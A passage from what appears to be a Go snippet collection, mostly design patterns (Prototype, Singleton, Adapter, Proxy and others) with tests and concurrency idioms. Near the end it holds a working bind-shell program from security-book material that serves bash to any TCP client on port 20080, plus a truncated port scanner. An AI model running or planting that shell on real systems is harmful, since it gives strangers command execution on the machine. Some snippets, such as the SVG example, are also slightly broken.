    factory.CreateProduct("C"),
  }
  for i, product := range products {
    if action := product.Use(); action != assert[i] {
      t.Errorf("Expect action to %s, but %s.\n", assert[i], action)
    }
  }
}
==================================================
Pattern Prototype
(tags: pattern prototype)
---

https://github.com/AlexanderGrom/go-patterns

The Prototype pattern is an object-level procreative pattern.

The Prototype pattern allows you to create new objects by copying (cloning) a previously created original product object (prototype).

The pattern describes the process of creating clone objects based on an existing prototype object, in other words, the Prototype pattern describes how the cloning process is organized.

Required for implementation:

1. The base class Prototype, which declares the cloning interface. All its inheriting classes must implement this cloning mechanism;
2. The ConcretePrototypeA product class that must implement this prototype;
3. The ConcretePrototypeB product class that must implement this prototype.

Usually the cloning operation occurs through the clone () method, which is described in the base class and must be implemented by each product.

package prototype

// Prototyper provides a cloning interface.
type Prototyper interface {
  Clone() Prototyper
  GetName() string
}
// ConcreteProduct implements product "A"
type ConcreteProduct struct {
  name string // Имя продукта
}
// NewConcreteProduct is the Prototyper constructor.
func NewConcreteProduct(name string) Prototyper {
  return &ConcreteProduct{
    name: name,
  }
}
// GetName returns product name
func (p *ConcreteProduct) GetName() string {
  return p.name
}
// Clone returns a cloned object.
func (p *ConcreteProduct) Clone() Prototyper {
  return &ConcreteProduct{p.name}
}

func TestPrototype(t *testing.T) {
  product := NewConcreteProduct("A")
  cloneProduct := product.Clone()
  if cloneProduct.GetName() != product.GetName() {
    t.Error("Expect name \"A\" to equal, but not equal.")
  }
}
==================================================
Pattern Singleton
(tags: pattern singleton)
---

https://github.com/AlexanderGrom/go-patterns

The Singleton pattern is an object-level ancestor pattern.
The pattern controls the creation of a single instance of a certain class and provides access to it.
In other words, Singleton ensures that the class has only one instance and provides an access point to it through a factory method.

Required for implementation:

1. The GetInstance function, which creates an instance of the Singleton class only once. If an instance has already been created before, then it simply returns this instance.

package singleton

import "sync"

// Singleton implementation.
type Singleton struct {
}
var (
  instance *Singleton
  once     sync.Once
)
// GetInstance returns singleton
func GetInstance() *Singleton {
  once.Do(func() {
    instance = &Singleton{}
  })
  return instance
}

func TestSingleton(t *testing.T) {
  instance1 := GetInstance()
  instance2 := GetInstance()
  if instance1 != instance2 {
    t.Error("Objects are not equal!\n")
  }
}
==================================================
Pattern Adapter
(tags: pattern adapter)
---

https://github.com/AlexanderGrom/go-patterns

The Adapter pattern is a class-level structural pattern.

Often in a new project, developers want to reuse existing code. For example, existing classes may have the desired functionality and yet have incompatible interfaces. In such cases, the Adapter pattern should be used.

The meaning of this pattern is that if you have a class and its interface is not compatible with the code of your system, then in order to resolve this conflict, we do not change the code of this class, but write an adapter for it. In other words, Adapter adapts existing code to the required interface (it is an adapter).

Required for implementation:

1. Target interface, describing the target interface (the interface with which our system would like to work);
2. The Adaptee class, which our system must adapt for itself;
3. An Adapter class, an adapter that implements the target interface.

package adapter

// Target provides an interface with which the system should work.
type Target interface {
  Request() string
}
// Adaptee implements system to be adapted.
type Adaptee struct {
}
// NewAdapter is the Adapter constructor.
func NewAdapter(adaptee *Adaptee) Target {
  return &Adapter{adaptee}
}
// SpecificRequest implementation.
func (a *Adaptee) SpecificRequest() string {
  return "Request"
}
// Adapter implements Target interface and is an adapter.
type Adapter struct {
  *Adaptee
}
// Request is an adaptive method.
func (a *Adapter) Request() string {
  return a.SpecificRequest()
}

func TestAdapter(t *testing.T) {
  adapter := NewAdapter(&Adaptee{})
  req := adapter.Request()
  if req != "Request" {
    t.Errorf("Expect volume to %s, but %s", "Request", req)
  }
}
==================================================
Pattern Bridge
(tags: pattern bridge)
---

https://github.com/AlexanderGrom/go-patterns

The Bridge pattern refers to object-level structural patterns.

The Bridge pattern allows you to separate an object into abstraction and implementation so that they can change independently of each other.

If several implementations are possible for one abstraction, then inheritance is usually used. However, this approach is not always convenient, since inheritance tightly ties the implementation to the abstraction, which makes it difficult to independently modify and complicate their reuse.

The pattern should be used when we have an abstraction and several implementations of it. Of course, it makes no sense to separate the abstraction from the implementation if there can be only one implementation.

I have not found any adequate description of the "Bridge" pattern. Everything that I have come across is either not true and examples are sucked from the finger or very blurry. From what I understand and can explain on my fingers - the Bridge is a tricky aggregation. The class that implements the product, implements the interface of the aggregated class, which is slipped at the stage of creating an instance of the product class.

As I understand it ... we have 3 cars and 3 different engines. Every engine fits every machine, i.e. it implements its interface. If we do this by inheritance, we get 9 different classes. It turns out that each vehicle has 3 modifications. This is inconvenient, so we will slip the engine at the stage of creating the car. Also, each engine can run on a different fuel, diesel or gasoline, so as not to produce 6 different implementations, when creating an engine, we will slip the type of fuel into it.

To implement the pattern in this example, you need to add a field in the base car class to store a pointer to the implementation type, the value of which the class will receive in its constructor, and call the methods of the nested object, if necessary.

Required for implementation:

1. Base abstract class (in our case, describing a car);
2. A class that implements the base class. It has a property in which we will slip the pointer to the engine used (the car can work with any of the presented engines);
3. Abstraction of the engine;
4. Realization of the engine.

In general, the property storing a pointer to the used object is a bridge. We can slip different objects into it, the main thing is that they have the same interface.

package bridge

// Carer provides car interface.
type Carer interface {
  Rase() string
}
// Enginer provides engine interface.
type Enginer interface {
  GetSound() string
}
// Car implementation.
type Car struct {
  engine Enginer
}
// NewCar is the Car constructor.
func NewCar(engine Enginer) Carer {
  return &Car{
    engine: engine,
  }
}
// Rase implementation.
func (c *Car) Rase() string {
  return c.engine.GetSound()
}
// EngineSuzuki implements Suzuki engine.
type EngineSuzuki struct {
}
// GetSound returns sound of the engine.
func (e *EngineSuzuki) GetSound() string {
  return "SssuuuuZzzuuuuKkiiiii"
}
// EngineHonda implements Honda engine.
type EngineHonda struct {
}
// GetSound returns sound of the engine.
func (e *EngineHonda) GetSound() string {
  return "HhoooNnnnnnnnnDddaaaaaaa"
}
// EngineLada implements Lada engine.
type EngineLada struct {
}
// GetSound returns sound of the engine.
func (e *EngineLada) GetSound() string {
  return "PhhhhPhhhhPhPhPhPhPh"
}

func TestBridge(t *testing.T) {
  expect := "SssuuuuZzzuuuuKkiiiii"
  car := NewCar(&EngineSuzuki{})
  sound := car.Rase()
  if sound != expect {
    t.Errorf("Expect sound to %s, but %s", expect, sound)
  }
}
==================================================
Pattern Composite
(tags: pattern composite)
---

https://github.com/AlexanderGrom/go-patterns

The Composite pattern refers to object-level structural patterns.

The Composite pattern groups similar objects into tree structures.

Arrays representing the branches of the tree will be used to build the tree.

Required for implementation:

1. Basic abstract class Component which provides an interface for both branches and leaves of a tree;
2. The Composite class that implements the Component interface and is a branch of the tree;
3. The Leaf class, which implements the Component interface and is a leaf of the tree.

Note that a leaf in a tree is a leaf node class and cannot have descendants (a branch or other leaf cannot grow from a leaf).

Branches of a tree define the behavior of objects included in the tree structure, which have descendants, and also store the components of the tree themselves. In other words, branches can contain other branches and leaves.

The main purpose of the pattern is to provide a single interface to both the composite (branch) and the final (leaf) object, so that the client does not think about which object he is working with.

package composite

// Component provides an interface for branches and leaves of a tree.
type Component interface {
  Add(child Component)
  Name() string
  Child() []Component
  Print(prefix string) string
}
// Directory implements branches of a tree
type Directory struct {
  name   string
  childs []Component
}
// Add appends an element to the tree branch.
func (d *Directory) Add(child Component) {
  d.childs = append(d.childs, child)
}
// Name returns name of the Component.
func (d *Directory) Name() string {
  return d.name
}
// Child returns child elements.
func (d *Directory) Child() []Component {
  return d.childs
}
// Print returns the branche in string representation.
func (d *Directory) Print(prefix string) string {
  result := prefix + "/" + d.Name() + "\n"
  for _, val := range d.Child() {
    result += val.Print(prefix + "/" + d.Name())
  }
  return result
}
// File implements a leaves of a tree
type File struct {
  name string
}
// Add implementation.
func (f *File) Add(child Component) {
}
// Name returns name of the Component.
func (f *File) Name() string {
  return f.name
}
// Child implementation.
func (f *File) Child() []Component {
  return []Component{}
}
// Print returns the leave in string representation.
func (f *File) Print(prefix string) string {
  return prefix + "/" + f.Name() + "\n"
}
// NewDirectory is constructor.
func NewDirectory(name string) *Directory {
  return &Directory{
    name: name,
  }
}
// NewFile is constructor.
func NewFile(name string) *File {
  return &File{
    name: name,
  }
}

func TestComposite(t *testing.T) {
  expect := "/root\n/root/usr\n/root/usr/B\n/root/A\n"
  rootDir := NewDirectory("root")
  usrDir := NewDirectory("usr")
  fileA := NewFile("A")
  rootDir.Add(usrDir)
  rootDir.Add(fileA)
  fileB := NewFile("B")
  usrDir.Add(fileB)
  result := rootDir.Print("")
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Decorator
(tags: pattern decorator)
---

https://github.com/AlexanderGrom/go-patterns

Decorator pattern refers to object-level structural patterns.

The Decorator pattern is used to extend the functionality of objects by dynamically adding new capabilities to an object. When implementing the pattern, the composition relation is used.

The essence of the decorator's work is to wrap the finished object with new functionality, while the entire original interface of the object remains accessible, by sending the decorator of all requests to the wrapped object.

Required for implementation:

1. The base abstract class Component which provides an interface for the decorator and component classes;
2. The ConcreteDecorator class, which implements the Component interface and reloads all methods of the component; if necessary, functionality is added to them;
3. The ConcreteComponent class implements the Component interface and will be wrapped with a decorator.

With such a structure, it doesn't matter to us whether the component is a decorator or a concrete implementation, since they have the same interface, and we can make decorator chains. Thus, dynamically change the state and behavior of the object.

I heard the example with Carlson and I really liked it. We have Carlson, we put a jumpsuit on him, thereby changing his state, then we put a propeller on his pants, thereby changing his behavior. The propeller can be removed, depending on the situation, by changing the behavior to the opposite, or you can wear a different overalls with different properties.

package decorator

// Component provides an interface for a decorator and component.
type Component interface {
  Operation() string
}
// ConcreteComponent implements a component.
type ConcreteComponent struct {
}
// Operation implementation.
func (c *ConcreteComponent) Operation() string {
  return "I am component!"
}
// ConcreteDecorator implements a decorator.
type ConcreteDecorator struct {
  component Component
}
// Operation wraps operation of component
func (d *ConcreteDecorator) Operation() string {
  return "<strong>" + d.component.Operation() + "</strong>"
}

func TestDecorator(t *testing.T) {
  expect := "<strong>I am component!</strong>"
  decorator := &ConcreteDecorator{&ConcreteComponent{}}
  result := decorator.Operation()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Facade
(tags: pattern facade)
---

https://github.com/AlexanderGrom/go-patterns

The Facade pattern refers to object-level structural patterns.

The Facade pattern provides a high-level unified interface in the form of a set of method names to a set of related classes or objects of a subsystem, which makes it easier to use.

Dividing a complex system into subsystems simplifies the development process, and also helps to minimize the dependence of one subsystem on another. However, using such subsystems becomes quite difficult. One way to solve this problem is the Facade pattern. Our task is to make a simple, unified interface through which one could interact with subsystems.

An example is the car interface. Modern cars have a unified driver interface that hides a complex subsystem. Thanks to the use of sophisticated electronics that do most of the work for the driver, he can easily drive a car without thinking about how everything works there.

Required for implementation:

1. The Facade class provides unified access for the subsystem classes;
2. Subsystem class SubSystemA;
3. Subsystem class SubSystemB;
4. Subsystem class SubSystemC.

Note that the facade is not the only point of access to the subsystem, nor does it limit the capabilities that might be needed by "advanced" users who want to work directly with the subsystem.

package facade

import "strings"

// NewMan creates man.
func NewMan() *Man {
  return &Man{
    house: &House{},
    tree:  &Tree{},
    child: &Child{},
  }
}
// Man implements man and facade.
type Man struct {
  house *House
  tree  *Tree
  child *Child
}
// Todo returns that man must do.
func (m *Man) Todo() string {
  result := []string{
    m.house.Build(),
    m.tree.Grow(),
    m.child.Born(),
  }
  return strings.Join(result, "\n")
}
// House implements a subsystem "House"
type House struct {
}
// Build implementation.
func (h *House) Build() string {
  return "Build house"
}
// Tree implements a subsystem "Tree"
type Tree struct {
}
// Grow implementation.
func (t *Tree) Grow() string {
  return "Tree grow"
}
// Child implements a subsystem "Child"
type Child struct {
}
// Born implementation.
func (c *Child) Born() string {
  return "Child born"
}

func TestFacade(t *testing.T) {
  expect := "Build house\nTree grow\nChild born"
  man := NewMan()
  result := man.Todo()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Flyweight
(tags: pattern flyweight)
---

https://github.com/AlexanderGrom/go-patterns

The Flyweight pattern refers to object-level structural patterns.

The Flyweight pattern is used to efficiently support a large number of small objects, it allows you to reuse small objects in different contexts.

Required for implementation:

1. The FlyweightFactory class, which is a modified factory pattern for creating flyweight;
2. Base abstract class Flyweight, to describe the general interface of flyweight;
3. The ConcreteFlyweight class implements a flyweight that will replace the same small objects.

The bottom line is that we can request opportunists from the factory upon request, in turn, it will return those objects that have already been created, or create new ones. This means that we will use the already created objects, and not create even more, if the objects for ours already exist.

package flyweight

// Flyweighter interface
type Flyweighter interface {
  GetName() string
  SetName(name string)
}
// FlyweightFactory implements a factory.
// If a suitable flyweighter is in pool, then returns it.
type FlyweightFactory struct {
  pool map[int]Flyweighter
}
// GetFlyweight creates or returns a suitable Flyweighter by state.
func (f *FlyweightFactory) GetFlyweight(state int) Flyweighter {
  if f.pool == nil {
    f.pool = make(map[int]Flyweighter)
  }
  if _, ok := f.pool[state]; !ok {
    f.pool[state] = &ConcreteFlyweight{state: state}
  }
  return f.pool[state]
}
// ConcreteFlyweight implements a Flyweighter interface.
type ConcreteFlyweight struct {
  state int
  name  string
}
// GetName returns name
func (f *ConcreteFlyweight) GetName() string {
  return "My name: " + f.name
}
// SetName sets a name
func (f *ConcreteFlyweight) SetName(name string) {
  f.name = name
}

func TestFlyweight(t *testing.T) {
  expect := "My name: Jeck"
  factory := new(FlyweightFactory)
  flyweight1 := factory.GetFlyweight(1)
  flyweight2 := factory.GetFlyweight(2)
  flyweight3 := factory.GetFlyweight(3)
  flyweight1.SetName("Jim")
  flyweight2.SetName("Jeck")
  flyweight3.SetName("Jill")
  flyweightN := factory.GetFlyweight(2)
  result := flyweightN.GetName()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Proxy
(tags: pattern proxy)
---

https://github.com/AlexanderGrom/go-patterns

The Proxy pattern refers to object-level structural patterns.

The Proxy pattern provides an object to control access to another object.

Another name for the pattern is "Surrogate". In this sense, it is an item or product that replaces any other item or product with which the surrogate has only some common properties, but it does not have all the qualities of the original item or product.

The Proxy pattern puts forward a number of important requirements, namely that the original object and its surrogate must interact with each other, and there must also be a possibility of replacing the original object, a surrogate at the place of its use, respectively, the interaction interfaces of the original object and its surrogate must coincide.

It will be easier for you to understand the pattern if you've watched the movie "Surrogates".

Required for implementation:

1. Interface Subject, which is a common interface for a real object and its surrogate;
2. The RealSubject class that implements the real object;
3. The Proxy class that implements the surrogate object. Stores a reference to the real object, which allows the proxy to access the real object directly;

For example, the Proxy pattern can be used if we need to manage resource-intensive objects, but we don't want to instantiate such objects until they are actually used.

You might think this is the same as Adapter or Decorator. But...

Proxy provides the same interface to its object.
Adapter provides a different interface.
Decorator provides an advanced interface.

package proxy

// Subject provides an interface for a real subject and its surrogate.
type Subject interface {
  Send() string
}
// Proxy implements a surrogate.
type Proxy struct {
  realSubject Subject
}
// Send sends a message
func (p *Proxy) Send() string {
  if p.realSubject == nil {
    p.realSubject = &RealSubject{}
  }
  return "<strong>" + p.realSubject.Send() + "</strong>"
}
// RealSubject implements a real subject
type RealSubject struct {
}
// Send sends a message
func (s *RealSubject) Send() string {
  return "I’ll be back!"
}

func TestProxy(t *testing.T) {
  expect := "<strong>I’ll be back!</strong>"
  proxy := new(Proxy)
  result := proxy.Send()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Specification
(tags: pattern specification)
---

https://github.com/AlexanderGrom/go-patterns

A specification is a design pattern by which a business logic rule representation can be transformed into a chain of objects linked by Boolean logic operations.

// Pattern Specification
//
// In the following example, we are retrieving invoices and sending them to a collection agency if
//  1. they are overdue,
//  2. notices have been sent, and
//  3. they are not already with the collection agency.
// This example is meant to show the end result of how the logic is 'chained' together.
//
// This usage example assumes a previously defined OverdueSpecification class
// that is satisfied when an invoice's due date is 30 days or older,
// a NoticeSentSpecification class that is satisfied when three notices
// have been sent to the customer, and an InCollectionSpecification class
// that is satisfied when an invoice has already been sent to the collection
// agency. The implementation of these classes isn't important here.

package specification

// Data for analysis
type Invoice struct {
  Day    int
  Notice int
  IsSent bool
}
/////
// Invoice Specification Interface
type Specification interface {
  IsSatisfiedBy(Invoice) bool
  And(Specification) Specification
  Or(Specification) Specification
  Not() Specification
  Relate(Specification)
}
/////
// Invoice BaseSpecification
type BaseSpecification struct {
  Specification
}
// Check specification
func (self *BaseSpecification) IsSatisfiedBy(elm Invoice) bool {
  return false
}
// Condition AND
func (self *BaseSpecification) And(spec Specification) Specification {
  a := &AndSpecification{
    self.Specification, spec,
  }
  a.Relate(a)
  return a
}
// Condition OR
func (self *BaseSpecification) Or(spec Specification) Specification {
  a := &OrSpecification{
    self.Specification, spec,
  }
  a.Relate(a)
  return a
}
// Condition NOT
func (self *BaseSpecification) Not() Specification {
  a := &NotSpecification{
    self.Specification,
  }
  a.Relate(a)
  return a
}
// Relate to specification
func (self *BaseSpecification) Relate(spec Specification) {
  self.Specification = spec
}
/////
// AndSpecification
type AndSpecification struct {
  Specification
  compare Specification
}
// Check specification
func (self *AndSpecification) IsSatisfiedBy(elm Invoice) bool {
  return self.Specification.IsSatisfiedBy(elm) && self.compare.IsSatisfiedBy(elm)
}
/////
// OrSpecification
type OrSpecification struct {
  Specification
  compare Specification
}
// Check specification
func (self *OrSpecification) IsSatisfiedBy(elm Invoice) bool {
  return self.Specification.IsSatisfiedBy(elm) || self.compare.IsSatisfiedBy(elm)
}
/////
// NotSpecification
type NotSpecification struct {
  Specification
}
// Check specification
func (self *NotSpecification) IsSatisfiedBy(elm Invoice) bool {
  return !self.Specification.IsSatisfiedBy(elm)
}
/////
// Invoice's due date is 30 days or older
type OverDueSpecification struct {
  Specification
}
// Check specification
func (self *OverDueSpecification) IsSatisfiedBy(elm Invoice) bool {
  return elm.Day >= 30
}
// Constructor
func NewOverDueSpecification() Specification {
  a := &OverDueSpecification{&BaseSpecification{}}
  a.Relate(a)
  return a
}
// Three notices have been sent to the customer
type NoticeSentSpecification struct {
  Specification
}
// Check specification
func (self *NoticeSentSpecification) IsSatisfiedBy(elm Invoice) bool {
  return elm.Notice >= 3
}
// Constructor
func NewNoticeSentSpecification() Specification {
  a := &NoticeSentSpecification{&BaseSpecification{}}
  a.Relate(a)
  return a
}
// Invoice has already been sent to the collection agency.
type InCollectionSpecification struct {
  Specification
}
// Check specification
func (self *InCollectionSpecification) IsSatisfiedBy(elm Invoice) bool {
  return !elm.IsSent
}
// Constructor
func NewInCollectionSpecification() Specification {
  a := &InCollectionSpecification{&BaseSpecification{}}
  a.Relate(a)
  return a
}

func TestSpecification(t *testing.T) {
  overDue := NewOverDueSpecification()
  noticeSent := NewNoticeSentSpecification()
  inCollection := NewInCollectionSpecification()
  sendToCollection := overDue.And(noticeSent).And(inCollection.Not())
  invoice := Invoice{
    Day:    31,    // >= 30
    Notice: 4,     // >= 3
    IsSent: false, // false
  }
  // true!
  result := sendToCollection.IsSatisfiedBy(invoice)
  if !result {
    t.Errorf("Expect result to equal %v, but %v.\n", false, true)
  }
}
==================================================
Idiom functional options in constructor
(tags: idiom functional options constructor)
---

https://github.com/tmrts/go-patterns

Functional options are a method of implementing clean/eloquent APIs in Go. Options implemented as a function set the state of that option.

type Options struct {
  UID         int
  GID         int
  Flags       int
  Contents    string
  Permissions os.FileMode
}

type Option func(*Options)

func UID(userID int) Option {
  return func(args *Options) {
    args.UID = userID
  }
}
func GID(groupID int) Option {
  return func(args *Options) {
    args.GID = groupID
  }
}
func Contents(c string) Option {
  return func(args *Options) {
    args.Contents = c
  }
}
func Permissions(perms os.FileMode) Option {
  return func(args *Options) {
    args.Permissions = perms
  }
}

func New(filepath string, setters ...Option) error {
  // Default Options
  args := &Options{
    UID:         os.Getuid(),
    GID:         os.Getgid(),
    Contents:    "",
    Permissions: 0644,
    Flags:       os.O_CREATE | os.O_EXCL | os.O_WRONLY,
  }
  for _, setter := range setters {
    setter(args)
  }
  f, err := os.OpenFile(filepath, args.Flags, args.Permissions)
  if err != nil {
    return err
  } else {
    defer f.Close()
  }
  if _, err := f.WriteString(args.Contents); err != nil {
    return err
  }
  return f.Chown(args.UID, args.GID)
}

func main() {
  New("empty.txt")
  New("file.txt", UID(1000), Contents("Lorem Ipsum Dolor Amet"))
}
==================================================
Pattern FanIn
(tags: pattern fanin merge)
---

https://github.com/tmrts/go-patterns

Fan-In is a messaging pattern used to create a funnel for work amongst workers (clients: source, server: destination).

We can model fan-in using the Go channels.

package main

import (
  "fmt"
  "sync"
  "time"
)

// Merge different channels in one channel
func Merge(cs ...<-chan int) <-chan int {
  var wg sync.WaitGroup
  out := make(chan int)
  // Start an send goroutine for each input channel in cs. send
  // copies values from c to out until c is closed, then calls wg.Done.
  send := func(c <-chan int) {
    for n := range c {
      out <- n
    }
    wg.Done()
  }
  wg.Add(len(cs))
  for _, c := range cs {
    go send(c)
  }
  // Start a goroutine to close out once all the send goroutines are
  // done.  This must start after the wg.Add call.
  go func() {
    wg.Wait()
    close(out)
  }()
  return out
}

func main() {
  ch1 := make(chan int, 3)
  ch2 := make(chan int, 3)
  go func() {
    for i := 0; i < 3; i++ {
      ch1 <- i
    }
  }()
  go func() {
    for i := 0; i < 3; i++ {
      ch2 <- i
    }
  }()
  ch3 := Merge(ch1, ch2)

  // without goroutine there will be deadlock!

  //go func() {
  //  for val := range ch3 {
  //    fmt.Println(val)
  //  }
  //}()

  go func() {
    for {
      select {
      case val := <- ch3:
        fmt.Println(val)
      }
    }
  }()
  time.Sleep(time.Second)
}
==================================================
Pattern FanOut
(tags: pattern fanout split)
---

https://github.com/tmrts/go-patterns

Fan-Out is a messaging pattern used for distributing work amongst workers (producer: source, consumers: destination).

We can model fan-out using the Go channels.

package main

import (
  "fmt"
  "time"
)

// Split a channel into n channels that receive messages in a round-robin fashion.
func Split(ch <-chan int, n int) []chan int {
  cs := make([]chan int, 0, n)
  for i := 0; i < n; i++ {
    cs = append(cs, make(chan int))
  }
  // Distributes the work in a round robin fashion among the stated number
  // of channels until the main channel has been closed. In that case, close
  // all channels and return.
  distributeToChannels := func(ch <-chan int, cs []chan int) {
    // Close every channel when the execution ends.
    //defer func(cs []chan int) {
    //  for _, c := range cs {
    //    close(c)
    //  }
    //}(cs)
    for {
      for _, c := range cs {
        select {
        case val, ok := <-ch:
          if !ok {
            return
          }

          c <- val
        }
      }
    }
  }

  go distributeToChannels(ch, cs)

  return cs
}

func main() {
  ch1 := make(chan int, 6)
  go func() {
    for i := 0; i < 6; i++ {
      ch1 <- i
    }
  }()
  chs := Split(ch1, 2)

  go func() {
    for {
      select {
      case val := <-chs[0]:
        fmt.Println(val)
      case val := <-chs[1]:
        fmt.Println(val)
      default:
      }
    }
  }()
  time.Sleep(time.Second)
}
==================================================
Pattern Circuit breaker
(tags: pattern circuit breaker)
---

https://github.com/tmrts/go-patterns

Similar to electrical fuses that prevent fires when a circuit that is connected to the electrical grid starts drawing a high amount of power which causes the wires to heat up and combust, the circuit breaker design pattern is a fail-first mechanism that shuts down the circuit, request/response relationship or a service in the case of software development, to prevent bigger failures.

circuit.Counter is a simple counter that records success and failure states of a circuit along with a timestamp and calculates the consecutive number of failures.

Circuit is wrapped using the circuit.Breaker closure that keeps an internal operation counter. It returns a fast error if the circuit has failed consecutively more than the specified threshold. After a while it retries the request and records it.

Note: Context type is used here to carry deadlines, cancelation signals, and other request-scoped values across API boundaries and between processes.

package main

import (
  "fmt"
  "io/ioutil"
  "log"
  "net/http"

  "github.com/sony/gobreaker"
)

// Get wraps http.Get in CircuitBreaker.
func Get(cb *gobreaker.CircuitBreaker, url string) ([]byte, error) {
  body, err := cb.Execute(func() (interface{}, error) {
    resp, err := http.Get(url)
    if err != nil {
      return nil, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
      return nil, err
    }
    return body, nil
  })
  if err != nil {
    return nil, err
  }
  return body.([]byte), nil
}

func main() {
  var st gobreaker.Settings
  st.Name = "HTTP GET"
  st.ReadyToTrip = func(counts gobreaker.Counts) bool {
    failureRatio := float64(counts.TotalFailures) / float64(counts.Requests)
    return counts.Requests >= 3 && failureRatio >= 0.6
  }
  cb := gobreaker.NewCircuitBreaker(st)

  body, err := Get(cb, "http://www.google.com/robots.txt")
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println(string(body))
}
==================================================
Pattern Semaphore
(tags: pattern semaphore)
---

https://github.com/tmrts

A semaphore is a synchronization pattern/primitive that imposes mutual exclusion on a limited number of resources.

package main

import (
  "errors"
  "fmt"
  "time"
)

var (
  ErrNoTickets      = errors.New("semaphore: could not aquire semaphore")
  ErrIllegalRelease = errors.New("semaphore: can't release the semaphore without acquiring it first")
)

// Interface contains the behavior of a semaphore that can be acquired and/or released.
type Interface interface {
  Acquire() error
  Release() error
}

type implementation struct {
  sem     chan struct{}
  timeout time.Duration
}

func (s *implementation) Acquire() error {
  select {
  case s.sem <- struct{}{}:
    return nil
  case <-time.After(s.timeout):
    return ErrNoTickets
  }
}

func (s *implementation) Release() error {
  select {
  case _ = <-s.sem:
    return nil
  case <-time.After(s.timeout):
    return ErrIllegalRelease
  }
  return nil
}

func New(tickets int, timeout time.Duration) Interface {
  return &implementation{
    sem:     make(chan struct{}, tickets),
    timeout: timeout,
  }
}

func main() {
  // if tickets = 1 and timeout < 3*time.Second there will be a panic "semaphore: could not aquire semaphore"
  tickets, timeout := 3, time.Second
  s := New(tickets, timeout)
  for i := 0; i < 3; i++{
    go func(i int) {
      if err := s.Acquire(); err != nil {
        panic(err)
      }
      time.Sleep(1 * time.Second)
      fmt.Println("work", i)
      if err := s.Release(); err != nil {
        panic(err)
      }
    }(i)
  }
  time.Sleep(4 * time.Second)
}
==================================================
Create file with svg image
(tags: file svg image)
---

package main

import "github.com/ajstarks/svgo"

func main() {
  f, err := os.Create("1.svg")
  canvas := svg.New(io.Writer(f))
  canvas.Start(800, 600)
  txtOpt := "text-anchor:left;font-family:monospace;font-size:16px;fill:black"
  lineOpt := "fill:none;stroke-width:2px;stroke:rgb(0,255,0)"
  rectOpt := "fill:white;stroke-width:6px;stroke:rgb(0,255,255)"
  p.canvas.Roundrect(10, 10, 100, 30, 10, 10, rectOpt)
  p.canvas.Text(50, 50, "some text", txtOpt)
  p.canvas.Qbez(10, 20, 30, 40, 50, 60, lineOpt)
  p.canvas.End()
}
==================================================
Server with svg image in response
(tags: server svg image)
---

package main

import "github.com/ajstarks/svgo"

func main() {
  http.Handle("/circle", http.HandlerFunc(circle))
  err := http.ListenAndServe(":2003", nil)
}

func circle(w http.ResponseWriter, req *http.Request) {
  w.Header().Set("Content-Type", "image/svg+xml")
  s := svg.New(w)
  s.Start(500, 500)
  s.Circle(250, 250, 125, "fill:none;stroke:black")
  s.End()
}
==================================================
Reader and writer std in and out
(tags: reader writer std in out)
---

https://github.com/blackhat-go

package main

import (
  "fmt"
  "io"
  "log"
  "os"
)

// FooReader defines an io.Reader to read from stdin.
type FooReader struct{}

// Read reads data from stdin.
func (fooReader *FooReader) Read(b []byte) (int, error) {
  fmt.Print("in > ")
  return os.Stdin.Read(b)
}

// FooWriter defines an io.Writer to write to Stdout.
type FooWriter struct{}

// Write writes data to Stdout.
func (fooWriter *FooWriter) Write(b []byte) (int, error) {
  fmt.Print("out> ")
  return os.Stdout.Write(b)
}

func main() {
  // Instantiate reader and writer.
  var (
    reader FooReader
    writer FooWriter
  )

  if _, err := io.Copy(&writer, &reader); err != nil {
    log.Fatalln("Unable to read/write data")
  }
}
==================================================
Tcp echo server
(tags: tcp server)
---

https://github.com/blackhat-go

package main

import (
  "io"
  "log"
  "net"
)

// echo is a handler function that simply echoes received data.
func echo(conn net.Conn) {
  defer conn.Close()

  // Create a buffer to store received data.
  b := make([]byte, 512)
  for {
    // Receive data via conn.Read into a buffer.
    size, err := conn.Read(b[0:])
    if err == io.EOF {
      log.Println("Client disconnected")
      break
    }
    if err != nil {
      log.Println("Unexpected error")
      break
    }
    log.Printf("Received %d bytes: %s", size, string(b))

    // Send data via conn.Write.
    log.Println("Writing data")
    if _, err := conn.Write(b[0:size]); err != nil {
      log.Fatalln("Unable to write data")
    }
  }
}

func main() {
  // Bind to TCP port 20080 on all interfaces.
  listener, err := net.Listen("tcp", ":20080")
  if err != nil {
    log.Fatalln("Unable to bind to port")
  }
  log.Println("Listening on 0.0.0.0:20080")
  for {
    // Wait for connection. Create net.Conn on connection established.
    conn, err := listener.Accept()
    log.Println("Received connection")
    if err != nil {
      log.Fatalln("Unable to accept connection")
    }
    // Handle the connection. Using goroutine for concurrency.
    go echo(conn)
  }
}
==================================================
Remote shell
(tags: tcp shell remote std in out exec)
---

https://github.com/blackhat-go

package main

import (
  "io"
  "log"
  "net"
  "os/exec"
)

func handle(conn net.Conn) {
  /*
   * Explicitly calling /bin/sh and using -i for interactive mode
   * so that we can use it for stdin and stdout.
   * For Windows use exec.Command("cmd.exe")
   */
  //cmd := exec.Command("cmd.exe")
  //cmd := exec.Command("/bin/sh", "-i")
  cmd := exec.Command("/bin/bash", "-i")
  //cmd := exec.Command("pwd")
  rp, wp := io.Pipe()
  // Set stdin to our connection
  cmd.Stdin = conn
  cmd.Stdout = wp
  cmd.Stderr = wp
  go io.Copy(conn, rp)
  cmd.Run()
  conn.Close()
}

func main() {
  listener, err := net.Listen("tcp", ":20080")
  if err != nil {
    log.Fatalln(err)
  }
  for {
    conn, err := listener.Accept()
    if err != nil {
      log.Fatalln(err)
    }
    go handle(conn)
  }
}
==================================================
Port scanner
(tags: port scanner)
---

https://github.com/blackhat-go

package main

import (
  "fmt"
  "net"
  "sort"
)

func worker(ports, results chan int) {
  for p := range ports {
    address := fmt.Sprintf("scanme.nmap.org:%d", p)
    conn, err := net.Dial("tcp", address)
    if err != nil {
      results <- 0
      continue
    }
    conn.Close()
    results <- p
  }
}

func main() {
  ports := make(chan int, 100)
  results := make(chan int)
